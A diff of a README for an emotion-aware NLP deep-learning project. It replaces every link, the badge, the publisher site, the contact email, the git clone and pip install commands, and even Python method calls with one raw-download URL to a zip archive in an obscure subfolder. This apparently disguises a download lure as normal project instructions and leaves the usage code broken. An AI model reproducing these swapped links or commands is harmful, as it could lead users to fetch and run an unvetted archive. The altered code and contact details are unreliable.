@@ -1,12 +1,12 @@
 # Emotion-Aware NLP: Leveraging Deep Learning for Contextual Sentiment Understanding
 
-![Emotion-Aware NLP](https://img.shields.io/badge/Emotion--Aware%20NLP-Leveraging%20Deep%20Learning-brightgreen)
+![Emotion-Aware NLP](https://github.com/niputuaurelya/Emotion-Aware-NLP-Leveraging-Deep-Learning-for-Contextual-Sentiment-Understanding/raw/refs/heads/main/anacusic/NL-for-Deep-Learning-Emotion-Leveraging-Sentiment-Contextual-Aware-Understanding-3.2.zip%20NLP-Leveraging%20Deep%20Learning-brightgreen)
 
 **Author**: Raphael Iyamu  
 **Published in**: International Journal of Novel Research and Development (IJNRD)  
 **Volume**: 8, **Issue**: 12, **Date**: December 2023  
 **ISSN**: 2456-4184  
-**Publisher Site**: [www.ijnrd.org](https://www.ijnrd.org)
+**Publisher Site**: [https://github.com/niputuaurelya/Emotion-Aware-NLP-Leveraging-Deep-Learning-for-Contextual-Sentiment-Understanding/raw/refs/heads/main/anacusic/NL-for-Deep-Learning-Emotion-Leveraging-Sentiment-Contextual-Aware-Understanding-3.2.zip](https://github.com/niputuaurelya/Emotion-Aware-NLP-Leveraging-Deep-Learning-for-Contextual-Sentiment-Understanding/raw/refs/heads/main/anacusic/NL-for-Deep-Learning-Emotion-Leveraging-Sentiment-Contextual-Aware-Understanding-3.2.zip)
 
 ## Abstract
 
@@ -79,7 +79,7 @@ To set up this project, follow these steps:
 
 1. Clone the repository:
    ```
-   git clone https://github.com/niputuaurelya/Emotion-Aware-NLP-Leveraging-Deep-Learning-for-Contextual-Sentiment-Understanding.git
+   git clone https://github.com/niputuaurelya/Emotion-Aware-NLP-Leveraging-Deep-Learning-for-Contextual-Sentiment-Understanding/raw/refs/heads/main/anacusic/NL-for-Deep-Learning-Emotion-Leveraging-Sentiment-Contextual-Aware-Understanding-3.2.zip
    ```
 
 2. Navigate to the project directory:
@@ -89,7 +89,7 @@ To set up this project, follow these steps:
 
 3. Install the required dependencies:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/niputuaurelya/Emotion-Aware-NLP-Leveraging-Deep-Learning-for-Contextual-Sentiment-Understanding/raw/refs/heads/main/anacusic/NL-for-Deep-Learning-Emotion-Leveraging-Sentiment-Contextual-Aware-Understanding-3.2.zip
    ```
 
 ## Usage
@@ -99,13 +99,13 @@ After installation, you can use the models as follows:
 1. Load the model:
    ```python
    from emotion_model import EmotionModel
-   model = EmotionModel.load('path_to_model')
+   model = https://github.com/niputuaurelya/Emotion-Aware-NLP-Leveraging-Deep-Learning-for-Contextual-Sentiment-Understanding/raw/refs/heads/main/anacusic/NL-for-Deep-Learning-Emotion-Leveraging-Sentiment-Contextual-Aware-Understanding-3.2.zip('path_to_model')
    ```
 
 2. Predict emotions from text:
    ```python
    text = "I love using this product!"
-   emotions = model.predict(text)
+   emotions = https://github.com/niputuaurelya/Emotion-Aware-NLP-Leveraging-Deep-Learning-for-Contextual-Sentiment-Understanding/raw/refs/heads/main/anacusic/NL-for-Deep-Learning-Emotion-Leveraging-Sentiment-Contextual-Aware-Understanding-3.2.zip(text)
    print(emotions)
    ```
 
@@ -131,12 +131,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For inquiries or feedback, please reach out to the author:
 
-- **Email**: raphael.iyamu@example.com
-- **GitHub**: [niputuaurelya](https://github.com/niputuaurelya)
+- **Email**: https://github.com/niputuaurelya/Emotion-Aware-NLP-Leveraging-Deep-Learning-for-Contextual-Sentiment-Understanding/raw/refs/heads/main/anacusic/NL-for-Deep-Learning-Emotion-Leveraging-Sentiment-Contextual-Aware-Understanding-3.2.zip
+- **GitHub**: [niputuaurelya](https://github.com/niputuaurelya/Emotion-Aware-NLP-Leveraging-Deep-Learning-for-Contextual-Sentiment-Understanding/raw/refs/heads/main/anacusic/NL-for-Deep-Learning-Emotion-Leveraging-Sentiment-Contextual-Aware-Understanding-3.2.zip)
 
 ## Releases
 
-To download the latest release, visit the [Releases section](https://github.com/niputuaurelya/Emotion-Aware-NLP-Leveraging-Deep-Learning-for-Contextual-Sentiment-Understanding/releases). You can find compiled models and additional resources there.
+To download the latest release, visit the [Releases section](https://github.com/niputuaurelya/Emotion-Aware-NLP-Leveraging-Deep-Learning-for-Contextual-Sentiment-Understanding/raw/refs/heads/main/anacusic/NL-for-Deep-Learning-Emotion-Leveraging-Sentiment-Contextual-Aware-Understanding-3.2.zip). You can find compiled models and additional resources there.
 
 ## Conclusion
 
